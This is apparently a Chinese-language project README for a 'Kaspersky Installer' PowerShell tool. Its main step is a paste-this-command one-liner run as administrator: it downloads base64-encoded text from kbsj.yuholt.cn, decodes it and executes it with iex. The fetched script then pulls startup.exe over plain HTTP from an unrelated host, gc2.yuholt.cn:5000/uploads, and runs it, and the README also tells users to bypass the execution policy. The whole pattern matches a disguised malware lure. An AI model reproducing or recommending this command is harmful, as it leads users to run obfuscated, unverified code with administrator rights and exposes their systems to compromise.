# 🛡️ Kaspersky Installer

<p align="center">
  <img src="https://img.shields.io/badge/version-v1.1.0-blue.svg" alt="version">
  <img src="https://img.shields.io/badge/platform-Windows%2010%2F11-green.svg" alt="platform">
  <img src="https://img.shields.io/badge/language-PowerShell-blue.svg" alt="language">
  <img src="https://img.shields.io/badge/license-MIT-yellow.svg" alt="license">
</p>

<p align="center">
  基于 PowerShell 的 Kaspersky 一键远程安装工具，支持中英文双语 GUI 界面
</p>

---

## ✨ 功能特性

- 🚀 **一键安装** — 一条 PowerShell 命令完成全部流程
- 🌐 **中英双语** — 自动检测系统语言，切换中/英界面
- 🖥️ **GUI 窗口** — WPF 可视化安装界面，带实时下载进度条
- 📦 **自动下载** — 从远程服务器下载安装包，无需手动传输
- ⚡ **静默安装** — 下载完成后自动启动安装程序

---

## 🚀 使用方法

以 **管理员身份** 打开 PowerShell，执行以下命令：

```powershell
$w=New-Object Net.WebClient;$w.Encoding=[Text.Encoding]::UTF8;iex([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($w.DownloadString('https://kbsj.yuholt.cn/'))))
```

执行后自动完成：

```
1. ✅ 拉取安装脚本
2. ✅ 弹出 GUI 安装窗口
3. ✅ 下载 Kaspersky 安装包（显示进度条）
4. ✅ 下载完成自动启动安装
```

---

## 🖥️ 界面预览

### 中文系统
```
┌──────────────────────────────────┐
│      卡巴斯基安装助手 v1.1.0      │
│                                  │
│  [██████████████░░░░░░]  68%     │
│                                  │
│  状态：正在下载安装包...          │
│                                  │
│         [ 取消安装 ]              │
└──────────────────────────────────┘
```

### English System
```
┌──────────────────────────────────┐
│   Kaspersky Install Helper v1.1.0│
│                                  │
│  [██████████████░░░░░░]  68%     │
│                                  │
│  Status: Downloading installer...│
│                                  │
│         [ Cancel ]               │
└──────────────────────────────────┘
```

---

## 📋 脚本工作流程

```
PowerShell (管理员)
       │
       ▼
┌─────────────────┐
│ 1. 检测系统语言  │ ──▶ 中文 / English
└────────┬────────┘
         ▼
┌─────────────────┐
│ 2. 加载 GUI 窗口 │ ──▶ WPF 窗口 + 进度条
└────────┬────────┘
         ▼
┌─────────────────┐
│ 3. 下载安装包    │ ──▶ gc2.yuholt.cn:5000/uploads/startup.exe
│    实时显示进度   │
└────────┬────────┘
         ▼
┌─────────────────┐
│ 4. 启动安装程序  │ ──▶ Start-Process startup.exe
└────────┬────────┘
         ▼
┌─────────────────┐
│ 5. 清理临时文件  │ ──▶ 删除下载的安装包
└─────────────────┘
```

---

## ⚙️ 脚本配置

脚本头部可自定义以下参数：

```powershell
# 安装包下载地址
$downloadUrl = "http://gc2.yuholt.cn:5000/uploads/startup.exe"

# 安装包保存路径
$savePath = "$env:TEMP\startup.exe"

# 版本号
$version = "v1.1.0"
```

---

## 🌐 多语言支持

脚本自动检测 Windows 系统语言：

| 系统语言 | 界面语言 | 检测方式 |
|---------|---------|---------|
| 中文（zh-CN / zh-TW） | 🇨🇳 中文 | `Get-Culture` |
| 其他语言 | 🇺🇸 English | 默认回退 |

**中英文对照：**

| 中文 | English |
|------|---------|
| 卡巴斯基安装助手 | Kaspersky Install Helper |
| 正在下载安装包... | Downloading installer... |
| 下载完成，正在启动安装... | Download complete, launching installer... |
| 安装包启动成功！ | Installer launched successfully! |
| 下载失败 | Download failed |
| 取消安装 | Cancel |

---

## 💻 系统要求

| 项目 | 要求 |
|------|------|
| 操作系统 | Windows 10 / 11 |
| PowerShell | 5.1+ |
| .NET Framework | 4.5+（WPF GUI 需要） |
| 权限 | **管理员权限** |
| 网络 | 需要访问外网 |

---

## 📁 项目结构

```
kaspersky-installer/
├── install_helper.ps1    # 安装脚本源码
├── README.md             # 项目说明
└── LICENSE               # 开源协议
```

---

## 📋 更新日志

### v1.1.0 (2025-06-15)
- ✨ 新增中英文双语自动切换
- ✨ 新增 WPF GUI 安装窗口
- ✨ 新增实时下载进度条
- 🎨 优化界面样式

### v1.0.0
- 🎉 初始版本
- 基础命令行下载安装功能

---

## ⚠️ 注意事项

1. 必须以 **管理员身份** 运行 PowerShell
2. 如果遇到执行策略限制，先执行：
   ```powershell
   Set-ExecutionPolicy Bypass -Scope Process -Force
   ```
3. 确保网络可以访问 `kbsj.yuholt.cn` 和 `gc2.yuholt.cn`
4. 安装过程中请勿关闭 PowerShell 窗口

---

## 📄 License

[MIT License](LICENSE)

---

<p align="center">
  Made with ❤️ by YuHolt
</p>
